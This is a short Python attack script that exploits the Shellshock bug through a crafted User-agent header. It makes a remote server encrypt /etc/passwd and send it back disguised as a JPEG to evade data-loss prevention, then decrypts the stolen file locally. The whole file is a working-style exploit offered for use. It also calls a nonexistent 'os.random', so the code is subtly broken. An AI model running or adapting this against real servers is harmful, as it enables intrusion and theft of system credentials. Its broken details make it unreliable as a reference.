#!/usr/bin/env python
# Bypass DLP by encrypting and saying it's a jpeg.
#
# credits: invisiblethreat

import binascii
import os
import requests
import subprocess
import sys

iv = binascii.b2a_hex(os.random(16))
kx = binascii.b2a_hex(os.random(16))

cmd = "/usr/bin/openssl aes-256-cbc -a -salt -iv " + iv + " -K " + kx + " \
    -in /etc/passwd"

headers = {'User-agent': '() { foo; }; \
           echo Content-type:image/jpeg;echo ;echo;' + cmd}

req = requests.get(sys.argv[1], headers=headers)

cmd = ["/usr/bin/openssl", "aes-256-cbc", "-a", "-d", "-iv", iv, "-K", kx]
proc = subprocess.Popen(cmd, stdin=subprocess.PIPE)
proc.communicate(req.text.strip())
